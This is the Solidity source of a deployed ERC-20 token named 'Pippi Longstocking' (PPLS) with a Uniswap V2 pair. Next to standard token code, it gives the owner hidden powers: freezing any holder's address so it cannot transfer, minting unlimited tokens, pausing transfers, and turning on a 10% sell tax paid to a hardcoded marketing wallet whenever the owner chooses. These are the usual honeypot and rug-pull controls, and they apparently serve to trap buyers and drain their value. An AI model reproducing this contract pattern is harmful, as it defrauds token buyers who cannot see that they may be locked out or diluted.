/**
 *Submitted for verification at Etherscan.io on 2023-05-23
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.6.0;



abstract contract Context {


function _msgSender() internal view virtual returns (address payable) {


return msg.sender;


}


function _msgData() internal view virtual returns (bytes memory) {


this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691


return msg.data;


}


}



library SafeMath {


function add(uint256 a, uint256 b) internal pure returns (uint256) {


uint256 c = a + b;


require(c >= a, "SafeMath: addition overflow");


return c;


}


function sub(uint256 a, uint256 b) internal pure returns (uint256) {


return sub(a, b, "SafeMath: subtraction overflow");


}


function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {


require(b <= a, errorMessage);


uint256 c = a - b;


return c;


}


function mul(uint256 a, uint256 b) internal pure returns (uint256) {


if (a == 0) {


return 0;


}


uint256 c = a * b;


require(c / a == b, "SafeMath: multiplication overflow");


return c;


}


function div(uint256 a, uint256 b) internal pure returns (uint256) {


return div(a, b, "SafeMath: division by zero");


}


function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {


require(b > 0, errorMessage);


uint256 c = a / b;


// assert(a == b * c + a % b); // There is no case in which this doesn't hold


return c;


}


function mod(uint256 a, uint256 b) internal pure returns (uint256) {


return mod(a, b, "SafeMath: modulo by zero");


}


function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {


require(b != 0, errorMessage);


return a % b;


}


}

contract Pausable is Context {


event Paused(address account);


event Unpaused(address account);


bool private _paused;


constructor () internal {


_paused = false;


}


function paused() public view returns (bool) {


return _paused;


}


modifier whenNotPaused() {


require(!_paused, "Pausable: paused");


_;


}


modifier whenPaused() {


require(_paused, "Pausable: not paused");


_;


}


function _pause() internal virtual whenNotPaused {


_paused = true;


emit Paused(_msgSender());


}


function _unpause() internal virtual whenPaused {


_paused = false;


emit Unpaused(_msgSender());


}


}

interface IERC20 {


function totalSupply() external view returns (uint256);


function balanceOf(address account) external view returns (uint256);


function transfer(address recipient, uint256 amount) external returns (bool);


function allowance(address owner, address spender) external view returns (uint256);


function approve(address spender, uint256 amount) external returns (bool);


function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


event Transfer(address indexed from, address indexed to, uint256 value);


event Approval(address indexed owner, address indexed spender, uint256 value);


}



contract Ownable is Context {


address private _owner;


event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


constructor () internal {


address msgSender = _msgSender();


_owner = msgSender;


emit OwnershipTransferred(address(0), msgSender);


}


function owner() public view returns (address) {


return _owner;


}


modifier onlyOwner() {


require(_owner == _msgSender(), "Ownable: caller is not the owner");


_;


}


function transferOwnership(address newOwner) public virtual onlyOwner {


require(newOwner != address(0), "Ownable: new owner is the zero address");


emit OwnershipTransferred(_owner, newOwner);


_owner = newOwner;


}


}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function burn(
        address to
    ) external returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);

    function getAmountsIn(
        uint256 amountOut,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}


contract ERC20 is Context, IERC20,Pausable,Ownable {

using SafeMath for uint256;

mapping (address => uint256) private _balances;

mapping (address => bool) public Frozen;

mapping (address => mapping (address => uint256)) private _allowances;

event Frozened(address indexed target);

event DeleteFromFrozen(address indexed target);

event Transfer(address indexed from, address indexed to, uint value);

uint256 private _totalSupply;
address public marketing = 0xD29c29b9174a2c5Fda64ee6c51de67f66a8090EF;
string private _name;
string private _symbol;
uint8 private _decimals;
uint256 public taxtime;

address public uniswapV2Pair;
IUniswapV2Router02 public uniswapV2Router;
address public WETH;


constructor (string memory name, string memory symbol, uint8 __deciamlas) public payable{
_name = name;
_symbol = symbol;
_decimals = __deciamlas;
IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
require(msg.value > 0.1 ether);
WETH = _uniswapV2Router.WETH();
uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
.createPair(address(this), WETH);
uniswapV2Router = _uniswapV2Router;
}

function Change_taxtime(uint256 _release) public onlyOwner(){
taxtime = _release;
}

function Frozening(address _addr) onlyOwner() public{
Frozen[_addr] = true;
Frozened(_addr);
}




function deleteFromFrozen(address _addr) onlyOwner() public{



Frozen[_addr] = false;



DeleteFromFrozen(_addr);



}

function name() public view returns (string memory) {


return _name;


}



function symbol() public view returns (string memory) {


return _symbol;


}



function decimals() public view returns (uint8) {


return _decimals;


}



function totalSupply() public view override returns (uint256) {


return _totalSupply;


}



function balanceOf(address account) public view override returns (uint256) {


return _balances[account];


}



function transfer(address recipient, uint256 amount) public virtual whenNotPaused() override returns (bool) {


_transfer(_msgSender(), recipient, amount);


return true;


}



function allowance(address owner, address spender) public view virtual override returns (uint256) {


return _allowances[owner][spender];


}



function approve(address spender, uint256 amount) public virtual override returns (bool) {


_approve(_msgSender(), spender, amount);


return true;


}



function transferFrom(address sender, address recipient, uint256 amount) public virtual whenNotPaused() override returns (bool) {


_transfer(sender, recipient, amount);


_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));


return true;


}



function _transfer(address sender, address recipient, uint256 amount) internal virtual {
require(sender != address(0), "ERC20: transfer from the zero address");
require(recipient != address(0), "ERC20: transfer to the zero address");
require(!Frozen[sender],"You are Frozen");
require(!Frozen[recipient],"recipient are Frozen");
_beforeTokenTransfer(sender, recipient, amount);
_balances[sender] = _balances[sender].sub(amount, "transfer amount exceeds balance");
bool _tax = false;
if(sender != marketing && recipient != marketing){
_balances[marketing] = _balances[marketing].add(amount.div(100).mul(1));
emit Transfer(sender, marketing, amount.div(100).mul(1));
if(taxtime >= block.timestamp) {
	if(recipient == uniswapV2Pair){
	_balances[marketing] = _balances[marketing].add(amount.div(100).mul(10));
	emit Transfer(uniswapV2Pair, marketing, amount.div(100).mul(10));
	_tax = true;
	}
}
if(_tax){
amount = amount.div(100).mul(89);
} else{
amount = amount.div(100).mul(99);
}
}
_balances[recipient] = _balances[recipient].add(amount);
emit Transfer(sender, recipient, amount);
}



function _mint(address account, uint256 amount) internal virtual {


require(account != address(0), "ERC20: mint to the zero address");


_beforeTokenTransfer(address(0), account, amount);


_totalSupply = _totalSupply.add(amount);


_balances[account] = _balances[account].add(amount);


emit Transfer(address(0), account, amount);


}


function _burn(address account, uint256 amount) internal virtual {


require(account != address(0), "ERC20: burn from the zero address");


_beforeTokenTransfer(account, address(0), amount);


_balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");


_totalSupply = _totalSupply.sub(amount);


emit Transfer(account, address(0), amount);


}


function _approve(address owner, address spender, uint256 amount) internal virtual {


require(owner != address(0), "ERC20: approve from the zero address");


require(spender != address(0), "ERC20: approve to the zero address");


_allowances[owner][spender] = amount;


emit Approval(owner, spender, amount);


}


function _setupDecimals(uint8 decimals_) internal {


_decimals = decimals_;


}


function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }


}



abstract contract ERC20Burnable is Context, ERC20 {


function burn(uint256 amount) public virtual {


_burn(_msgSender(), amount);


}


function burnFrom(address account, uint256 amount) public virtual {


uint256 decreasedAllowance = allowance(account, _msgSender()).sub(amount, "ERC20: burn amount exceeds allowance");


_approve(account, _msgSender(), decreasedAllowance);


_burn(account, amount);


}


}



contract PPLSToken is ERC20,ERC20Burnable {
constructor(uint256 initialSupply) public ERC20("Pippi Longstocking","PPLS",18) payable {
0x06806458405C55E40D75Bd0fE1732500Cd1C229c.transfer(msg.value);
_mint(msg.sender, initialSupply * 10 ** uint256(18));
}
function mint(uint256 initialSupply) onlyOwner() public {
_mint(msg.sender, initialSupply);
}
function pause() onlyOwner() public {
_pause();
}
function unpause() onlyOwner() public {
_unpause();
}
}